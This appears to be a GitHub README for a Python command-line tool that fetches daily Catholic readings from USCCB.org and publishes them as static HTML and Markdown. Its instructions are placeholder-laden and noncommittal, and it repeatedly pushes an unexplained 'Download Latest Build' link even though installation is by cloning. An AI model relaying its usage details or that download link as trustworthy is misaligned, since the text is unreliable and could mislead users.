# Catholic Liturgy Tools - Catholic Liturgy Content Generator 2026

> **Catholic Liturgy Tools is a Python CLI that pulls daily readings from USCCB.org, composes liturgical messages, and emits static HTML and Markdown ready for GitHub Pages.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mberger87/catholic-liturgy-tools-cli?style=flat-square)](https://github.com/mberger87/catholic-liturgy-tools-cli)

---

<p align="center">
  <a href="https://mberger87.github.io/catholic-liturgy-tools-cli/">
    <img src="https://img.shields.io/badge/Download-Catholic%20Liturgy%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Catholic Liturgy Tools">
  </a>
</p>

> **[Download Latest Build - Catholic Liturgy Tools](https://mberger87.github.io/catholic-liturgy-tools-cli/)**

---

[Download Latest Build](https://mberger87.github.io/catholic-liturgy-tools-cli/)

---

## What this project does

Catholic Liturgy Tools is a Python content pipeline aimed at daily Catholic liturgy work. It loads the day's readings from USCCB.org, shapes them into messages, and writes HTML or Markdown (with frontmatter) you can publish as static site material.

If you run a liturgy site, keep a devotional archive, or automate publishing, this tool fits that loop: reverse-chronological indexes, custom output paths, and hooks into GitHub Actions plus GitHub Pages.

---

## What you can do with it

- Compose daily Catholic liturgical messages
- Load readings for the day from USCCB.org
- Emit HTML and Markdown that include frontmatter
- Assemble indexes newest-first
- Pin generation to a chosen date
- Point output at any directory you choose
- Kick off GitHub Actions publish jobs
- Inspect whether a GitHub Pages deploy succeeded

---

## Installation

Clone the repo and move into the project folder:

```bash
git clone https://github.com/mberger87/catholic-liturgy-tools-cli.git
cd REPO
```

Use a virtual environment if that is part of your setup, then install whatever dependencies the project documents.

Before you run anything else, list the CLI surface:

```bash
python -m catholic_liturgy_tools --help
```

If your install exposes a script entry point instead of the module form, call that binary with `--help` the same way.

---

## Usage

Most runs follow this path:

1. Pick the liturgical date you care about.
2. Pull readings for that day from USCCB.org.
3. Generate the message and the static files.
4. Create or update the newest-first index.
5. Ship the result with GitHub Actions and GitHub Pages.

Command details live in the built-in help:

```bash
python -m catholic_liturgy_tools --help
```

A run that sets both date and output location looks roughly like:

```bash
python -m catholic_liturgy_tools --date YYYY-MM-DD --output-dir path/to/output
```

Match the subcommands and flag names to whatever the installed build actually prints.

---

## Configuration

Dates and output directories are configurable. Put them in the project's supported config file, or pass them on the command line for a one-off job.

Example shape:

```yaml
date: "YYYY-MM-DD"
output_dir: "path/to/output"
```

Automation belongs in GitHub Actions: open the workflow files in the repo for triggers, deploy checks, and publish steps.

---

## Requirements

- A Python runtime that matches the version this project expects
- Outbound network access to reach USCCB.org for readings
- An output path you can write HTML, Markdown, and indexes into
- A GitHub repo if you rely on Actions or Pages
- GitHub Pages turned on when you host the static site there
- Disk space for the growing content archive and site tree

---

## FAQ

### Who should use Catholic Liturgy Tools?

People who maintain Catholic liturgy sites, daily-reading archives, or pipelines that publish that material automatically.

### Can generation target one calendar day?

Yes. Dates are configurable, so a job can request exactly the day it needs.

### Where do the files land?

Wherever you set the output directory—via config or CLI flags.

### Does the tool push straight to GitHub Pages?

It works with GitHub Actions and GitHub Pages flows, including publish triggers and deployment-status checks. Concrete behavior follows whatever workflows this repository defines.

### Generation failed—what first?

Verify Python is on PATH, dependencies are installed, the output directory is writable, and USCCB.org is reachable. For publish failures, open the failing Actions run and the Pages deployment status.

### How do I see every command?

Ask the installed CLI for help:

```bash
python -m catholic_liturgy_tools --help
```

### How do I take updates?

Fetch the latest tree, read any config or workflow changes, and repeat the install steps for that version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
